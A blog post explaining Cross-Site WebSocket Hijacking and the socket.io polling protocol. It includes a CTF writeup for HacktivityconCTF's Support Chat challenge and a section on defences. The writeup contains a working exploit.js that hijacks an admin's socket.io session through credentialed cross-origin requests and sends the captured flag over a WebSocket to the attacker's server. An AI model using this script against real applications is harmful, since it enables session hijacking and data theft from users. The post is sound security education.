---
layout: post
title: Cross Site WebSocket Hijacking with socketio
excerpt: "Cross-Site WebSocket Hijacking or (CSWSH), yes the acronym is absurdly long, is a technique where an attacker can hijack a WebSocket on a targetted site and essentially send and receive messages like the victim. In this blog post, I will specifically explore how this can be done with socketio when the requests are not upgraded to actual WebSockets. In addition to explaining how this attack type works, this post will include a specific writeup for Support Chat,  a CTF problem from HacktivityconCTF."
categories: [Blog, Writeups, HactivityconCTF'20]
tags: [web]
---

Cross-Site WebSocket Hijacking or (CSWSH), yes the acronym is absurdly long, is a technique where an attacker can hijack a WebSocket on a targetted site and essentially send and receive messages like the victim. In this blog post, I will specifically explore how this can be done with socketio when the requests are not upgraded to actual WebSockets. In addition to explaining how this attack type works, this post will include a specific writeup for Support Chat,  a CTF problem from HacktivityconCTF.

#### Brief overview of web architectures

Before I can explain how any of this cross-site hijacking can occur, it is important to first understand what WebSockets are and how they work. In the typical client-server model of a webserver, the relationship is normally unidirectional. What this means is the client is first sending a request to the server, then in a separate stream, the server is sending some information back to the client. This model works pretty well when a site is static and only needs to display information as was common when the internet first started. However, with web applications becoming increasingly prominent and emphasis being placed on user interactions, many new challenges arose.

To solve the problem of user interaction, a new model, the REST API was devised. This was the birth of the terms backend and frontend as the backend would be an API that could store, modify, and return data from a database while the frontend served to render it. For the most part, this satisfied the needs of web developers and is one of the most common models today. However, even the REST API architecture has its limitations. New needs such as pushing real-time information to the client became common but the REST architecture was not great at solving this problem. In order to enable this new form of real-time bidirectional communication between the client and the server, the concepts of WebSockets were created. Essentially, a WebSocket creates a tunnel where the server can send and receive messages to a client and an event will fire on the client when a message is received. 

#### How does a WebSocket work?

##### WebSocket

This article is about WebSockets so you may be asking why I talked about REST APIs. The answer is that with socketio it is possible to use a WebSocket, but it can also do similar behavior to a WebSocket by using a unidirectional communication similar to a REST API. I will first explain in depth how a traditional WebSocket works then how socketio functions.

With a normal WebSocket, the client would open a WebSocket connection to the server with javascript. This is an example taken from the WebSocket setup I use for CTF challenges.
```javascript
const logSocket = new WebSocket('wss://your_domain:1337');  
  
logSocket.addEventListener('open', _event => {  
	logSocket.send('connection was made!');
});
```
As you can see, it is really simple. The client will open a communication tunnel with the server, either secure (WSS) or insecure (WS), then it can send messages and when the client receives a message, there will be a receive message event which the developer can choose to process and display.

##### Socketio

Socketio can handle these requests a bit differently. One route the library will take is upgrading to an actual WebSocket connection. However, if that option is not available, it will handle real-time communication in a slightly different manner through active polling. Although most of this is abstracted through the socketio library, I will explain the protocol in-depth as I think how it works is pretty interesting.

The main reference for understanding how the protocol works is [this document](https://github.com/socketio/socket.io-protocol) which describes the protocol. However, as you will see there is much more we have to do.


Keep in mind that for all of these requests below, the fetch request must include credentials via the `credentials: 'include'` parameter in a fetch request.

The first request which must be made to the socketio server is just a GET request to the /socket.io/ route. This doesn't do much in regards to sending a message. Instead, this is how we get our SID which is the identifier for our connection. An example request would look like this.

```javascript
fetch(base_url + '/socket.io/', {'credentials': 'include'})
```

To understand the next steps, it is important to understand the structure of a socketio 'packet'. It always follows this format: [total size of packet]:[protocol version number][packet type number][data]. An example packet to connect would look like this. `8:40/test,` You can see that `40/test,` is 8 characters long, hence the packet starting with 8. In addition, you see 40 which signifies socketio protocol version 4 and packet type 0, which represents a connection. Finally, it is followed by the data which would be `/test`.
  
Here is what each packet type represents

-   0: CONNECTION
-   1: DISCONNECT
-   2: EVENT
-   3: ACK
-   4: ERROR
-   5: BINARY_ACK

Following getting our SID from the socketio server, we must perform a handshake (signal a connection) with the server. In order to do this, we must send a packet of type 0 with a body specifying the namespace. The previous example explaining the structure of a socketio packet provides a clear example. `8:40/test,` is what a full connection packet would look like. Now if we send this we will be all good right? Well, how do we actually send a packet to the server?

There are essentially two requirements. First, it must be a post request with the packet as the body. Second, we need the proper URL parameters. Specifically, we have to add 3 parameters to our request: EIO, transport, and sid. The EIO is the engineio version that socketio is using. Transport defines the transport mode and should be polling because we are not upgrading to WebSockets. Finally, the SID is the SID that we received from our previous GET request. As you can see,  the request is becoming increasingly complex. However, we now understand the basics of the socketio protocol.

Here is a full example of a handshake request. This is where some of the details will be specific to the Support Chat problem from HacktivityconCTF. The namespace used in the challenge was `/test` which was default to Flask-SocketIO and the EIO version was also observed from other requests.
```javascript
fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'credentials': 'include', 'body': '8:40/test,'})
```

Great, now we essentially have a communication tunnel with the socketio server. First, let's look at how we can send some information to the socketio server. Because all we are doing is essentially sending a packet to the socketio server, the request is going to be very similar to the handshake request with the only difference being the actual packet. 

It is important to understand that the underlying architecture of socketio is based on events the client can send to the server. These are determined by the developer but some common examples would be to join a chat room or send a message. To signal to the socketio server that we are sending some information we need to send a packet of type 2, which is an event, followed by the actual data of the event. Because the protocol type changed, we should now prefix our data with `42`. The actual data itself must also be formatted. First must be the namespace followed by an array of size 2 with the first element being the event name and the second element being the event data. An example packet would be `51:42/test,["event_name",{"event_data":"hello_world"}]`.

To simplify this process, I created a small helper function which adds the packet structure, so the length, protocol version and number, and namespace.
```javascript
function genPayload(body){
    let data = '42/test,' + body;
    data = '' + data.length + ':' + data
    return data
}
```

With the help of the above function, a full request to the socketio server which signifies an event with name `join` and event data `{"room":"rpjim"}` would look like this.
```javascript
let payload = genPayload('["join",{"room":"rpjim"}]');
fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'credentials': 'include', 'body': payload});
```

Now that we can initiate a connection and send a message (event), the last barrier is receiving the data. Unlike a WebSocket where there will be an event to the WebSocket that we can hook into, socketio handles it through polling. What that means is the client is constantly keeping a connection with the socketio server saying that it is an attempt to receive information. To accomplish this, the client must continuously make GET requests to the socketio server. Each request creates a stream that will be kept open while there is no message. However, once there is a message, the server will send the information through the stream and the initial fetch request will receive the information. There is a timeout on the request but I won't focus on that too much because I'm not 100% sure how that works.

What this looks like in practice is that the client always has at least one stream open with the server; this is different from a WebSocket where it is the same connection. Each stream is a new and different GET request. If you look in the network tab, each request with no status is because the stream is still open and it is waiting for a response. Once a message is received, the fetch function returns, and the data is then processed. This behavior of streams can be found in [my flask server which purposefully creates streams](https://github.com/jimmyl02/playground/tree/master/flask-stream).

The question now is how can we emulate this behavior without actually using the socketio library. The answer is quite simple but relies on the fact that a message will be sent quickly. All we have to do is just send one poll request and grab the result. Because we know that within the period of us polling for a message and the request timeout there is going to be a response, we can assume that our fetch request will successfully finish and we can grab the text data using .text(). Here is an example of how we can execute a single poll request.
```javascript
const res = fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'credentials': 'include'})
const text = await res.text();
```

With that, we now fully understand the inner workings of socketio. We can now create a connection, trigger an event, and receive messages.

#### Security vulnerabilities with WebSockets

As per the title of this post, the vulnerability we will be looking at is Cross-Site WebSocket Hijacking. The main problem is that WebSockets are just like regular requests except they are bidirectional. However, they do not have one of the most important protections built into them, the Same Origin Policy (SOP). As explored by [Christian Schneider](https://christian-schneider.net/CrossSiteWebSocketHijacking.html), even though the `Origin` header is sent along with the WebSocket request, cors does not send headers nor does the browser use this information. This makes hijacking a WebSocket almost trivial.

Think of this as a Cross-Site Request Forgery attack. You can get the victim to do something to the WebSocket by simply visiting your website as there is no verification of the origin. All that you need to do is create a new WebSocket connection to the endpoint with cookies included and you can now fully impersonate the victim.

With socketio polling, the attack is essentially the same. The only problem is that because polling is done through REST-style requests, SOP is active and will block requests from different origins unless there is a special header. In the following example problem from HacktivityconCTF, you will see what the difference must be.

#### Example of exploitation


This challenge from HacktivityconCTF had one major component, a chat window. There are 2 key things to know about the window. If there is a URL sent to the chat, the admin will visit it and if the command `!flag` is run from the admin user then the bot will display the flag. 

Seeing that this was a chat application, I knew that somehow WebSockets were being used here. Specifically, I deduced it to be Flask-SocketIO using polling mode based on the error messages and the network requests.

As I mentioned earlier, because it was polling mode, the requests are actually done via a normal request, meaning SOP was active. This posed a major problem because we need to be able to read back data from both the initial request to get our SID and to poll and read the text from the server. If this was configured securely, there would be no way to hijack the socket from a different origin. However, looking at the requests I noticed that for GET requests to the socketio route, a special header `Access-Control-Allow-Credentials: *` was included. What this header means is that we are able to send credentials (cookies) with the request and still be able to read the response, perfect for our situation. If the header was set properly to only the website domain, we would still be able to send requests but would be unable to read the response, leaving us unable to fully hijack the socket and impersonate the admin. In regards to the POST requests and sending events, because we only need to send the data and not receive it, we can send the credentials with `mode: 'no-cors'` and have the server receive our request cross-origin.

With all this in mind, this is the final exploit.js file which would need to be loaded on your server. It is important to note that because browsers will not allow the mixing of HTTPS and HTTP, your server must be on HTTP.

```javascript
const logSocket = new WebSocket('wss://your_ip:1337');

logSocket.addEventListener('open', _event => {
    doExploit();
});

function log(msg){
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function genPayload(body){
    let data = '42/test,' + body;
    data = '' + data.length + ':' + data
    return data
}

async function doExploit(){
    const base_url = 'http://nine.jh2i.com:50022'

    let res = await fetch(base_url + '/socket.io/', {'credentials': 'include'});
    let text = await res.text();

    let sid = text.split('sid":"')[1].split('",')[0];
    log('[*] Got sid: ' + sid);

    // handshake
    await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'mode': 'no-cors', 'credentials': 'include', 'body': '8:40/test,'});
    log('[*] Handshake complete');
    await sleep(100);

    // join room
    let payload = genPayload('["join",{"room":"rpjim"}]');
    await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'mode': 'no-cors', 'credentials': 'include', 'body': payload});
    log('[*] Joined room');
    await sleep(100);

    // start initial poll
    res = await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'credentials': 'include'});
    text = await res.text();
    log('[*] Polling result: ' + text);

    // send flag command
    payload = genPayload('["my_room_event",{"data":"!flag","room":"rpjim"}]');
    await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'mode': 'no-cors', 'credentials': 'include', 'body': payload});
    log('[*] Sent flag command');

    // poll for flag
    res = await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'credentials': 'include'});
    text = await res.text();
    log('[*] Polling result: ' + text);
}
```

Essentially I used what I explained above about how socketio works and wrote my own HTTP requests to hijack the admin's socket. The admin would make a new conversation, send the `!flag` command, and finally poll for the response which had the flag and send it to my server via WebSockets (the irony). 

#### Defending against CSWSH


Now that we understand how WebSockets and socketio internally work, what are some ideas of how we can defend against cross-origin hijacking? As I briefly touched on in my exploit for Support Chat, the only reason why this particular application was vulnerable was because of an improperly configured header. Although the SOP was in effect, this header allows the inclusion of credentials cross-origin which should rarely be allowed. If it must be used, the developer should be extremely careful.

With true WebSockets, there are really only two ways to defend against this type of attack. 

The first defense is to have the WebSocket server check the Origin header. Although it is part of the spec that there is no SOP for WebSockets, the SOP is one of the strongest tools for preventing cross-origin hijacking. You can clearly see that for the Support Chat challenge unless there was an explicit developer security error, the application would've otherwise been secure. The main difficulty here is that now the responsibility is with the developers of the frameworks such as Flask-SocketIO to implement this origin check for WebSockets. As seen from [this security report](https://github.com/miguelgrinberg/python-engineio/issues/128), this can cause problems as some developers are not being careful of using the same origin and adding this security change will cause a lot of applications to stop working.

The second defense is very similar to defenses against CSRF. The developers should add randomized tokens with each request that can only be accessed from the site. Only if the proper token is sent with each WebSocket message is it actually recognized.

With these defenses in mind, it brings up an interesting question. Is socketio using polling mode more secure than using real WebSockets? By default, there is a SOP because the requests are just standard GET requests, not WebSocket connections. However, WebSockets are much easier to use and don't require importing an extra library on the client. This is an interesting question and the costs and benefits are definitely something to think about.

#### Conclusion

WebSockets are a new and useful tool. They allow bidirectional communication between server and client and make real-time applications without extreme amounts of polling possible. However, there are some serious security implications. If configured improperly, it is possible for an attacker to completely take over the WebSocket. For example, if a bank support chat could be hijacked, the possibilities with what the attacker can do are infinite. Overall, I hope this post taught you about the inner workings of socketio in polling mode as well as introduced the concept of CSWSH in an understandable way.
